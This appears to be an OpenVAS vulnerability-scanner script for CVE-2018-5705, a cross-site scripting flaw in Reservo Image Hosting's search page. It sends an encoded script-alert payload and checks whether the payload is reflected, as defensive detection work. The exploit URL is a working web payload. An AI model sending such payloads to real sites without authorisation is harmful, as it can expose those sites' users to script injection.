###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_reservo_image_hosting_xss_vuln.nasl 8811 2018-02-14 12:41:44Z cfischer $
#
# Reservo Image Hosting XSS Vulnerability
#
# Authors:
# Jan Philipp Schulte <jan.schulte@greenbone.net>
#
# Copyright:
# Copyright (C) 2018 Greenbone Networks GmbH, https://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if( description )
{
  script_oid("1.3.6.1.4.1.25623.1.0.113086");
  script_version("$Revision: 8811 $");
  script_tag(name:"last_modification", value:"$Date: 2018-02-14 13:41:44 +0100 (Wed, 14 Feb 2018) $");
  script_tag(name:"creation_date", value:"2018-01-18 10:46:47 +0100 (Thu, 18 Jan 2018)");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");

  script_tag(name:"qod_type", value:"remote_app");

  script_tag(name:"solution_type", value:"VendorFix");

  script_cve_id("CVE-2018-5705");

  script_name("Reservo Image Hosting XSS Vulnerability");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2018 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_reservo_detect.nasl");
  script_mandatory_keys("reservo/installed");

  script_tag(name:"summary", value:"Reservo Image Hosting Scripts through 1.5 is vulnerable to an XSS attack.");
  script_tag(name:"vuldetect", value:"The script sends a specifically crafted package to the host and tries to exploit the XSS vulnerability.");
  script_tag(name:"insight", value:"The flaw exists within the software's search engine.");
  script_tag(name:"impact", value:"Successful exploitation would allow an attacker to trick other users to execute malicious code in their context.");
  script_tag(name:"affected", value:"Reservo Image Hosting Scripts through version 1.5");
  script_tag(name:"solution", value:"Update to Reservoce Image Hosting Scripts version 1.6.1 or above.");

  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/43676/");

  exit( 0 );
}

CPE = "cpe:/a:reservo:image_hosting";

include( "host_details.inc" );
include( "http_func.inc" );
include( "http_keepalive.inc" );

if( ! port = get_app_port( cpe: CPE ) ) exit( 0 );

timestamp = gettimeofday();
exploit_url = "/search/?s=image&t=%27%29%3B%2522%2520style%253D%22%3Cscript%3Ealert%28" + timestamp + "%29%3C%2Fscript%3E%3C";
req = http_get( port: port, item: exploit_url );
resp = http_keepalive_send_recv( port: port, data: req );

if( resp =~ 'loadBrowsePageRecentImages\\(.+\\);%22%20style%3D<script>alert\\(' + timestamp + '\\)</script>' || resp =~ 'loadBrowsePageAlbums\\(.+\\);%22%20style%3D<script>alert\\(' + timestamp + '\\)</script>' ) {
  report = report_vuln_url(  port: port, url: exploit_url );
  security_message( port: port, data: report );
}
else {
  exit( 99 );
}

exit( 0 );
